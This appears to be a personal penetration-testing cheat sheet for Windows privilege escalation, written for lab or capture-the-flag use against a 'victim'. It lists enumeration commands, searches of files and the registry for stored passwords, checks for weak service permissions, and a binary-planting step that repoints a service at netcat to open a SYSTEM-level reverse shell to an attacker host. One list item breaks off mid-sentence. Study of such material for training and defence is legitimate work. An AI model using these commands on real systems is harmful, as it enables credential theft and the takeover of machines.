
# Guide

1. Repeat below under every single privilege increase
2. Run [[#Default Commands]]
3. Check the users on the victim, `net users`


# Table of Contents

1. If a binary is found within a users directory it is likely exploitable.
2. General guide which lists a vast array of exploits and methods of exploitation, see [Privilege Escalation - Windows](https://mysecurityjournal.blogspot.com/p/client-side-attacks.html)
3. See [[Watson]] to find operating system vulnerabilities  
4. Flags may be within network drives, try mapping with: `net use Z: \\MACHINENAME\C$`
5. If you can access the `System32/config/SYSTEM` and `System32/config/SAM` files, see 
# Default Commands 

1. [[windows-privesc-check]]
2. [[WinPeas]]
3. [[Windows Exploit Suggester - Next Generation (WES-NG)]]



# Extra Enumeration Commands

```
// What system are we connected to?
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

// Get tokens and privileges 
whoami /priv

// Get the hostname and username (if available)
hostname
echo %username%

// Get users
net users
net user [username]

// Networking stuff
ipconfig /all

// Printer?
route print

// ARP-arific
arp -A

// Active network connections
netstat -ano

// Firewall fun (Win XP SP2+ only)
netsh firewall show state
netsh firewall show config

// Scheduled tasks
schtasks /query /fo LIST /v

// Running processes to started services
tasklist /SVC
net start

// Driver madness
DRIVERQUERY

// WMIC fun (Win 7/8 -- XP requires admin)
wmic /?
# Use wmic_info script!


// WMIC: check patch level
wmic qfe get Caption,Description,HotFixID,InstalledOn

// Search pathces for given patch
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."

// AlwaysInstallElevated fun
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

// Other commands to run to hopefully get what we need
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

// Service permissions
sc query
sc qc [service_name]
sc qc dllsvc (See [[DLL Hijacking]] )

// Accesschk stuff
accesschk.exe /accepteula (always do this first!!!!!)
accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
accesschk.exe -ucqv [service_name]

// Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\

// Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*

// Binary planting
sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
sc config [service_name] obj= ".\LocalSystem" password= ""
sc qc [service_name] (to verify!)
net start [service_name]
```